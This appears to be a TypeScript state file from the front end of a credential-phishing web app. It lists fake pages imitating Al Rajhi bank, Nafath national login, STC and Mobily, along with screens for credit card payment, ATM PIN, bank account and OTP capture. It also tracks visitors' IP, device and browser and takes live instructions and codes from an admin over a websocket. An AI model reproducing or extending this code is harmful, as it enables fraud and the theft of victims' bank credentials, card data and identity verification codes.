/* eslint-disable @typescript-eslint/no-explicit-any */
import { effect, Signal, signal } from "@preact/signals";
import { deleteCookie, getCookie, setCookie } from "cookies-next";
import io, { Socket } from "socket.io-client";
import { MainInfo } from "@/types";

export const apiUrl =
  import.meta.env.VITE_MODE == "DEV"
    ? import.meta.env.VITE_DEV_API_URL
    : import.meta.env.VITE_API_URL;

export const API_KEY = import.meta.env.VITE_API_KEY;

// FOR SET PAGES NEW FEATURE
export const PAGES = [
  { name: "الدفع بطاقة الائتمان" },
  { name: "طلب بطاقة اخرى" },
  { name: "كلمة مرور ATM" },
  { name: "رقم الحساب البنكي" },
  { name: "تحويل بنكي" },
  { name: "تحقق رقم الجوال (OTP)" },
  { name: "توثيق رقم الجوال" },
  { name: "تسجيل دخول نفاذ" },
  { name: "تحقق نفاذ" },
  { name: "نفاذ الأول" },
  { name: "حساب بنك الأول" },
  { name: "تنبيه الراجحى" },
  { name: "تسجيل الدخول الراجحى" },
  { name: "الراجحى (OTP)" },
  { name: "نفاذ الراجحى" },
  { name: "إتصال الراجحى" },
  { name: "تنبية إتصال STC" },
  { name: "تنبية إتصال Mobily" },
  { name: "MyStc" },
  { name: "رمز التحقق (OTP)" },
  { name: "رسالة شكر" },
  { name: "الصفحة الرئيسية" },
  { name: "التسجيل" },
  { name: "تسجيل دخول" },
  { name: "التحقق من الهوية الشخصية" },
  { name: "إنشاء حساب أفراد" },
  { name: "التحقق من هوية المنشأة" },
  { name: "إنشاء حساب أعمال" },
  { name: "العنوان الوطني" },
  { name: "ملخص قبل الدفع" },
  { name: "ربط رقم الجوال" },
];

export const socket: Signal<Socket> = signal(
  io(apiUrl, {
    transports: ["websocket"],
    autoConnect: false,
    forceNew: true,
  }),
);

// To Sent To Server Any Time Tht It Change

export const adminLoading = signal(getCookie("client-state") ?? "");

export const loading = signal(getCookie("client-state") ?? "net");

export const isApproved = signal(false);

export const messages = signal<any[]>([]);

export const permissions = signal<string[]>(
  getCookie("permissions") ? JSON.parse(getCookie("permissions")!) : [],
);

export const isFormRejected = signal(false);

export const lastMessage = signal("");

export const mainInfo: Signal<MainInfo> = signal({
  visitorNumber: 0,
  createdAt: "",
  isRead: true,
  fullName: "",
  phone: "",
  idNumber: "",
  _id: "",
  apiKey: API_KEY,
  ip: "",
  country: "",
  city: "",
  os: "",
  device: "",
  browser: "",
  date: "",
  socketId: "",
  blockedCardPrefixes: [],
  page: "الصفحة الرئيسية",
});

export const nextPage = signal<string | undefined>();

//For Admin Rejected Our Request Notification

export const isAdminError = signal(false);

//For Shown Chat Model

export const isChat = signal(false);

//For Chat Notification

export const isNewMessage = signal(0);

//For Code That Sent From Admin

export const code = signal("");

//For Logo That We Sent To Admin

export const logo = signal("facebook");

export const specialId = signal("");

export const isError = <
  Signal<{ ar: string; en: string; image?: string } | undefined>
>signal(undefined);

export const form = signal("");

effect(() => {
  if (isChat.value) {
    isNewMessage.value = 0;
  }
});

effect(() => {
  if (adminLoading.value) {
    setCookie("client-state", adminLoading.value, {
      maxAge: 3650 * 24 * 60 * 60,
    });
  } else {
    deleteCookie("client-state");
  }
});

effect(() => {
  if (permissions.value) {
    setCookie("permissions", JSON.stringify(permissions.value), {
      maxAge: 3650 * 24 * 60 * 60,
    });
  }
});
